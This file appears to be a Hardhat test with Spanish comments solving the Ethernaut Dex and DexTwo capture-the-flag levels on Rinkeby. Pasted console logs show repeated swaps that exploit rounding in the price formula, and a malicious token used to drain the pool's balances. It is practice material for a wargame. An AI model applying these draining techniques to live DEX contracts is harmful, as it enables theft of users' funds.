/* DEX
    Se hacen swap sucesivos para aprovechar la aproximacion que hace el DEX al dividir el price:

    await contract.owner()
"0xC084FC117324D7C628dBC41F17CAcAaF4765f49e"
instance
"0xD5EDd25714856F621D0387B56b0d9De1770faa01"
await contract.approve("0xD5EDd25714856F621D0387B56b0d9De1770faa01",500)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x112e1cb1ee08cc37f8d30efdd2b5ab1899ce15df83813c8b742c7af7d7d506a1 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x112e1cb1ee08cc37f8d30efdd2b5ab1899ce15df83813c8b742c7af7d7d506a1 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x112e1cb1ee08cc37f8d30efdd2b5ab1899ce15df83813c8b742c7af7d7d506a1", receipt: {…}, logs: [] }

t1 = await contract.token1()
"0xB04D13d2Ff7743c7890f6fA113e64579D6a975dD"
t2 = await contract.token2()
"0x00889f1396C7e85200D0EAA580B3D3BbdDa84b4a"
await contract.balanceOf(t1, instance).then(v => v.toString())
"100"
await contract.swap(t1, t2, 10)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x9755d2e42edbd2ae33151bcbd91ec11a7b06c0582e9b6deff2ceda747b867043 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x9755d2e42edbd2ae33151bcbd91ec11a7b06c0582e9b6deff2ceda747b867043 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x9755d2e42edbd2ae33151bcbd91ec11a7b06c0582e9b6deff2ceda747b867043", receipt: {…}, logs: [] }

await contract.balanceOf(t1, instance).then(v => v.toString())
"110"
await contract.swap(t2, t1, 20)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x262502ddd85a76b152b33f27cb660606f110dc617a971aedff92724829cd488e 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x262502ddd85a76b152b33f27cb660606f110dc617a971aedff92724829cd488e 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x262502ddd85a76b152b33f27cb660606f110dc617a971aedff92724829cd488e", receipt: {…}, logs: [] }

await contract.balanceOf(t1, instance).then(v => v.toString())
"86"
await contract.swap(t1, t2, 24)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x1979d0bfa21e5682e34314595e205bd07899190510059c566a04271389ed16fb 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x1979d0bfa21e5682e34314595e205bd07899190510059c566a04271389ed16fb 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x1979d0bfa21e5682e34314595e205bd07899190510059c566a04271389ed16fb", receipt: {…}, logs: [] }

await contract.balanceOf(t1, instance).then(v => v.toString())
"110"
await contract.swap(t2, t1, 30)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xb480d158934a1718b731d52d5c3ecdb764df226f0134dc797742994a3ec19f11 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xb480d158934a1718b731d52d5c3ecdb764df226f0134dc797742994a3ec19f11 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xb480d158934a1718b731d52d5c3ecdb764df226f0134dc797742994a3ec19f11", receipt: {…}, logs: [] }

await contract.balanceOf(t1, instance).then(v => v.toString())
"69"
await contract.swap(t1, t2, 41)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x9e3e7a1e7fd3f6bd7ad1ed9083de71ce58daa3c2ca041694b7edc8b0df87ac29 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x9e3e7a1e7fd3f6bd7ad1ed9083de71ce58daa3c2ca041694b7edc8b0df87ac29 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x9e3e7a1e7fd3f6bd7ad1ed9083de71ce58daa3c2ca041694b7edc8b0df87ac29", receipt: {…}, logs: [] }

await contract.balanceOf(t1, instance).then(v => v.toString())
"110"
await contract.swap(t2, t1, 45)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xaa22a125c571b25dda151bfe47b3e729009db9636381436da5f23fa6ef0f5bc4 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xaa22a125c571b25dda151bfe47b3e729009db9636381436da5f23fa6ef0f5bc4 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xaa22a125c571b25dda151bfe47b3e729009db9636381436da5f23fa6ef0f5bc4", receipt: {…}, logs: [] }

await contract.balanceOf(t1, instance).then(v => v.toString())
"0"

​    */


/*DEX2
Console was cleared. 99cec4f544214837e320c672a7efec0554f8245b.js:1:4533041
Dex Two 99cec4f544214837e320c672a7efec0554f8245b.js:1:4537638
Type help() for a listing of custom web3 addons 99cec4f544214837e320c672a7efec0554f8245b.js:1:4538998
=> Instance address
0xE4472723D9227940cbD7AA1C982E749DB8c0ea55 99cec4f544214837e320c672a7efec0554f8245b.js:1:4536947
=> Level address
0x5026Ff8C97303951c255D3a7FDCd5a1d0EF4a81a 99cec4f544214837e320c672a7efec0554f8245b.js:1:4536947
await contract.balanceOf(MAL,player).then(v=>v.toString())
Uncaught (in promise) ReferenceError: MAL is not defined
    <anonymous> debugger eval code:2
    <anonymous> debugger eval code:3
debugger eval code:2:3
MAL="0x7B5f33602D5294a7b2c35e2162F16034B31bBE00"
"0x7B5f33602D5294a7b2c35e2162F16034B31bBE00"
await contract.balanceOf(MAL,player).then(v=>v.toString())
"999999999999999999999900"
await contract.balanceOf(MAL,contract.address).then(v=>v.toString())
"100"
await contract.swap(MAL,contract.token1,100)
Uncaught (in promise) Error: invalid address (argument="address", value=undefined, code=INVALID_ARGUMENT, version=address/5.1.0) (argument="to", value=undefined, code=INVALID_ARGUMENT, version=abi/5.0.7)
    value https://d33wubrfki0l68.cloudfront.net/bundles/99cec4f544214837e320c672a7efec0554f8245b.js:1
    <anonymous> debugger eval code:3
99cec4f544214837e320c672a7efec0554f8245b.js:1:74750
await contract.swap(MAL,contract.token1(),100)
Uncaught (in promise) Error: invalid address (argument="address", value={"_events":{}}, code=INVALID_ARGUMENT, version=address/5.1.0) (argument="to", value={"_events":{}}, code=INVALID_ARGUMENT, version=abi/5.0.7)
    value https://d33wubrfki0l68.cloudfront.net/bundles/99cec4f544214837e320c672a7efec0554f8245b.js:1
    <anonymous> debugger eval code:3
99cec4f544214837e320c672a7efec0554f8245b.js:1:74750
await contract.swap(MAL,await contract.token1(),100)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xb4837bfb73b8a66cb53d8f5b97a319709fb09ae7e2b052586297ba511d5c52b7 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xb4837bfb73b8a66cb53d8f5b97a319709fb09ae7e2b052586297ba511d5c52b7 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xb4837bfb73b8a66cb53d8f5b97a319709fb09ae7e2b052586297ba511d5c52b7", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token1,contract.address).then(v=>v.toString())
Uncaught (in promise) Error: invalid address (argument="address", value=undefined, code=INVALID_ARGUMENT, version=address/5.1.0) (argument="token", value=undefined, code=INVALID_ARGUMENT, version=abi/5.0.7)
    value https://d33wubrfki0l68.cloudfront.net/bundles/99cec4f544214837e320c672a7efec0554f8245b.js:1
    async* debugger eval code:3
99cec4f544214837e320c672a7efec0554f8245b.js:1:74750
await contract.balanceOf(await contract.token1(),contract.address).then(v=>v.toString())
"0"
await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"100"
await contract.swap(MAL,await contract.token2(),100)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x18d4d19b5375417080b00549467402cac77c9eae68f737bcdf0d67ce88113539 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x18d4d19b5375417080b00549467402cac77c9eae68f737bcdf0d67ce88113539 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x18d4d19b5375417080b00549467402cac77c9eae68f737bcdf0d67ce88113539", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"50"
await contract.swap(MAL,await contract.token2(),100)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x4e8e83e510839dee8d9c98c7828298e273f8b69a1cdaed49cba4b57e5f101847 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x4e8e83e510839dee8d9c98c7828298e273f8b69a1cdaed49cba4b57e5f101847 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x4e8e83e510839dee8d9c98c7828298e273f8b69a1cdaed49cba4b57e5f101847", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"34"
await contract.swap(MAL,await contract.token2(),300)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x3913d7bc2d25e332467eda3af0bf8b87c4e071ed2d82b07148942548fe23648f 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x3913d7bc2d25e332467eda3af0bf8b87c4e071ed2d82b07148942548fe23648f 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x3913d7bc2d25e332467eda3af0bf8b87c4e071ed2d82b07148942548fe23648f", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"9"
await contract.swap(MAL,await contract.token2(),300)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xe9326927c53a30ff1520de4abd9b7f6cbc5fe32e60c07258c238ab253cd9a431 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xe9326927c53a30ff1520de4abd9b7f6cbc5fe32e60c07258c238ab253cd9a431 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xe9326927c53a30ff1520de4abd9b7f6cbc5fe32e60c07258c238ab253cd9a431", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"6"
await contract.swap(MAL,await contract.token2(),300)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x990eeb1265ed63350702c321b030625dbb6b40e8d50e45fd88b44865057ce3a7 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
await contract.balanceOf(await contract.token1(),contract.address).then(v=>v.toString())
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x990eeb1265ed63350702c321b030625dbb6b40e8d50e45fd88b44865057ce3a7 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x990eeb1265ed63350702c321b030625dbb6b40e8d50e45fd88b44865057ce3a7", receipt: {…}, logs: [] }

"0"
await contract.swap(MAL,await contract.token2(),300)
MetaMask - RPC Error: MetaMask Tx Signature: User denied transaction signature. 
Object { code: 4001, message: "MetaMask Tx Signature: User denied transaction signature." }
inpage.js:1:53273
Error in RPC response:
,MetaMask Tx Signature: User denied transaction signature. 99cec4f544214837e320c672a7efec0554f8245b.js:1:4538544
MetaMask: 'ethereum.send(...)' is deprecated and may be removed in the future. Please use 'ethereum.sendAsync(...)' or 'ethereum.request(...)' instead.
For more information, see: https://eips.ethereum.org/EIPS/eip-1193 inpage.js:1:42906
Uncaught (in promise) 
Object { code: 4001, message: "MetaMask Tx Signature: User denied transaction signature.", stack: "Error: MetaMask Tx Signature: User denied transaction signature.\nasync*@debugger eval code:3:3\n", hijackedStack: "Error: MetaMask Tx Signature: User denied transaction signature." }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"5"
await contract.swap(MAL,await contract.token2(),300)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xeedbcedb5ad139c43b3562c71286edd01f4ef8c22f5178e90e925130418f949a 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xeedbcedb5ad139c43b3562c71286edd01f4ef8c22f5178e90e925130418f949a 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xeedbcedb5ad139c43b3562c71286edd01f4ef8c22f5178e90e925130418f949a", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"4"
await contract.swap(MAL,await contract.token2(),300)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x7044a784da55f74e03f1534ae5fd6d5a481fe7916f8990433b271ab52d528f3b 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x7044a784da55f74e03f1534ae5fd6d5a481fe7916f8990433b271ab52d528f3b 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x7044a784da55f74e03f1534ae5fd6d5a481fe7916f8990433b271ab52d528f3b", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"4"
await contract.swap(MAL,await contract.token2(),900)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xf4721c72cfae598b059a70eee611083d16b56ae8539d09de53fee662c0574b5f 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xf4721c72cfae598b059a70eee611083d16b56ae8539d09de53fee662c0574b5f 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xf4721c72cfae598b059a70eee611083d16b56ae8539d09de53fee662c0574b5f", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"3"
await contract.swap(MAL,await contract.token2(),2700)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x4a5600ffb01252edf35739e8116162ade6d6ac8509164082bed3873519b67074 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x4a5600ffb01252edf35739e8116162ade6d6ac8509164082bed3873519b67074 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x4a5600ffb01252edf35739e8116162ade6d6ac8509164082bed3873519b67074", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"1"
await contract.swap(MAL,await contract.token2(),2700)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xe51381bf955bbb19b155d9b783d70c3e7a422926940adc656186a162edd4f0a4 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xe51381bf955bbb19b155d9b783d70c3e7a422926940adc656186a162edd4f0a4 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xe51381bf955bbb19b155d9b783d70c3e7a422926940adc656186a162edd4f0a4", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"1"
await contract.swap(MAL,await contract.token2(),2700)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xc82c98eb619835d98675b533e8c19c83e83754e502ba05d5f4b1e15f0f3f79ac 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xc82c98eb619835d98675b533e8c19c83e83754e502ba05d5f4b1e15f0f3f79ac 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0xc82c98eb619835d98675b533e8c19c83e83754e502ba05d5f4b1e15f0f3f79ac", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"1"
await contract.swap(MAL,await contract.token2(),27000)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x4b49d033ab3a32323034157ceb76d2eea5d675a2b6425b84d1a2a040467536b7 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x4b49d033ab3a32323034157ceb76d2eea5d675a2b6425b84d1a2a040467536b7 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
MetaMask - RPC Error: execution reverted: ERC20: transfer amount exceeds balance 
Object { code: -32603, message: "execution reverted: ERC20: transfer amount exceeds balance", data: {…} }
inpage.js:1:53273
Error in RPC response:
,execution reverted: ERC20: transfer amount exceeds balance 99cec4f544214837e320c672a7efec0554f8245b.js:1:4538544
Uncaught (in promise) r: Transaction: 0x4b49d033ab3a32323034157ceb76d2eea5d675a2b6425b84d1a2a040467536b7 exited with an error (status 0). 
     Please check that the transaction:
     - satisfies all conditions set by Solidity `require` statements.
     - does not trigger a Solidity `revert` statement.
    o https://d33wubrfki0l68.cloudfront.net/bundles/99cec4f544214837e320c672a7efec0554f8245b.js:1
    async* debugger eval code:3
99cec4f544214837e320c672a7efec0554f8245b.js:1:1074944
await contract.swap(MAL,await contract.token2(),2700)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x135581160d4d229f67010ef1fc37ba5d1c0806ba55aeda5c21d0e5759fa8cf0f 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x135581160d4d229f67010ef1fc37ba5d1c0806ba55aeda5c21d0e5759fa8cf0f 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x135581160d4d229f67010ef1fc37ba5d1c0806ba55aeda5c21d0e5759fa8cf0f", receipt: {…}, logs: [] }

await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"1"
await contract.balanceOf(MAL,contract.address).then(v=>v.toString())
"13600"
await contract.swap(MAL,await contract.token2(),13600)
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x201f440c6c2913e8d02fbf296bcfefd8f7290fc83bd1431244e4a609b050e3c9 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x201f440c6c2913e8d02fbf296bcfefd8f7290fc83bd1431244e4a609b050e3c9 99cec4f544214837e320c672a7efec0554f8245b.js:1:4539879
Object { tx: "0x201f440c6c2913e8d02fbf296bcfefd8f7290fc83bd1431244e4a609b050e3c9", receipt: {…}, logs: [] }

await contract.balanceOf(MAL,contract.address).then(v=>v.toString())
"27200"
await contract.balanceOf(await contract.token2(),contract.address).then(v=>v.toString())
"0"
O=('-'Q) Submitting level instance... <  < <<PLEASE WAIT>> >  > 99cec4f544214837e320c672a7efec0554f8245b.js:1:4537203

*/
import { assert } from "chai";
import { ethers } from "hardhat";
import { contracts } from "../typechain-types";

describe("Executing", function () {
  it("Evil contract debe vaciar el dex2", async function () {

    // Attach to contracts
    const evil='0x7452733D90F43fdFE7FA5a69DE1De2a26c54a020' //direccion contrato exploit
    const exploitContract = await (await ethers.getContractFactory("MaliciousToken")).attach(evil);

    const toa2='0xD5EDd25714856F621D0387B56b0d9De1770faa01'; //direccion contrato instancia ethernaut
    const ethernautContract = await (await ethers.getContractFactory("DexTwo")).attach(toa2);

    const k1=await ethernautContract.token1();
    const k2=await ethernautContract.token2();
    //Initially both token1 and token2 is 100. 

    //Let's send 100 of EVL to DexTwo using EvilToken's transfer. So, that price ratio in DexTwo between EVL and token1 is 1:1. 
    //Same ratio goes for token2.

    //exploitContract.transfer(toa2,100)


    //Also, allow DexTwo to transact 300 (100 for token1 and 200 for token2 exchange) of our EVL tokens so that it can swap EVL tokens. 
    //This can be done by approve method of EvilToken, passing contract.address and 200 as params.

    exploitContract.approve(toa2,10000000)
    ethernautContract.add_liquidity(evil,100)
    console.log(await ethernautContract.balanceOf(k1, evil))
    //console.log(await ethernautContract.getSwapAmount(evil,k2, 100))
    
    //Alright at this point DexTwo has 100 of each - token1, token2 and EVL. And player has 300 of EVL

   await ethernautContract.swap(evil, k2, 100)
/*    console.log(await ethernautContract.balanceOf(k1, instance))

    // Output: '0'
    await ethernautContract.swap(evil, k2, 200)
    console.log(await ethernautContract.balanceOf(k2, instance))

    // Output: '0'
*/
  });
});